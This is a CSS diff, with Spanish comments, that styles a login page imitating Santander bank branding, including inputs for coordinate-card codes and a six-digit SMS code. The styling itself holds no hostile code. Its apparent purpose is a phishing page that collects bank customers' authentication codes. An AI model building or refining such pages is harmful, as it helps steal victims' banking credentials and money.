@@ -1,4 +1,84 @@
-/* Inputs de coordenadas y SMS */
+body {
+  font-family: Arial, sans-serif;
+  background: #ffffff;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  min-height: 100vh;
+  margin: 0;
+  padding: 10px;
+}
+
+.login-box {
+  width: 100%;
+  max-width: 360px;
+  padding: 20px;
+  border: 1px solid #ddd;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.05);
+  text-align: center;
+  background: #fff;
+  margin: auto;
+}
+
+/* Logo autoajustado */
+.login-box img.logo {
+  max-width: 150px;   /* tamaño máximo en escritorio */
+  height: auto;
+  margin: 0 auto 20px auto;
+  display: block;
+}
+
+h1, h2 {
+  font-size: 18px;
+  margin-bottom: 15px;
+}
+
+.producto {
+  margin: 15px 0;
+  text-align: left;
+  font-size: 14px;
+}
+
+/* Botón Santander */
+.btn-santander {
+  width: auto;
+  min-width: 145px;
+  background-color: #ec0000;
+  border: 1px solid #ec0000;
+  color: #fff;
+  text-align: center;
+  font-size: 14px;
+  padding: 6px 12px;
+  border-radius: 30px;
+  cursor: pointer;
+  display: inline-block;
+  margin: 20px auto;
+  transition: 0.4s all ease;
+}
+
+.btn-santander:hover {
+  background-color: #b30000;
+  border-color: #b30000;
+}
+
+.sub-text {
+  margin-top: 10px;
+  font-size: 12px;
+  color: #333;
+  text-align: center;
+}
+
+/* 🔑 Estilos para coordenadas y SMS */
+.coord-container,
+.sms-container,
+.botones {
+  display: flex;
+  justify-content: center;
+  gap: 15px;
+  margin-top: 20px;
+}
+
 input.coord,
 input.sms {
   border: 1px solid #000;
@@ -12,27 +92,71 @@ input.sms {
 }
 
 input.coord {
-  width: 60px;   /* escritorio */
+  width: 60px;   /* coordenadas cortas en escritorio */
 }
 
 input.sms {
-  width: 120px;  /* escritorio */
+  width: 120px;  /* espacio para 6 dígitos en escritorio */
 }
 
-/* Responsive solo para coordenadas y SMS */
+/* Botones rojos */
+.btn-red {
+  background: red;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  padding: 12px 20px;
+  font-weight: bold;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.btn-red:hover {
+  background: #b30000;
+}
+
+/* ✅ Media queries para móviles */
 @media (max-width: 480px) {
-  input.coord,
-  input.sms {
-    width: 70%;       /* ✅ moderado, no ocupa todo el ancho */
-    font-size: 16px;  /* ✅ tamaño legible pero no exagerado */
-    padding: 10px;
+  .login-box {
+    max-width: 95%;
+    padding: 15px;
   }
 
+  /* Logo más pequeño en móviles */
+  .login-box img.logo {
+    max-width: 120px;
+    margin-bottom: 15px;
+  }
+
+  h1, h2 {
+    font-size: 16px;
+  }
+
+  .producto {
+    font-size: 13px;
+  }
+
+  .btn-santander {
+    min-width: 120px;
+    font-size: 13px;
+    padding: 6px 10px;
+  }
+
+  /* 📱 Ajustes responsive para coordenadas y SMS */
+  .coord-container,
+  .sms-container,
   .botones {
     flex-direction: column;
     align-items: center;
     gap: 12px;
     margin-top: 20px;
+  }
+
+  input.coord,
+  input.sms {
+    width: 70%;       /* ✅ moderado, no ocupa todo el ancho */
+    font-size: 16px;
+    padding: 10px;
   }
 
   .btn-red {
@@ -42,7 +166,7 @@ input.sms {
   }
 
   h1, h2 {
-    font-size: 18px;  /* ✅ títulos legibles pero no enormes */
+    font-size: 18px;
     text-align: center;
     margin: 12px;
   }
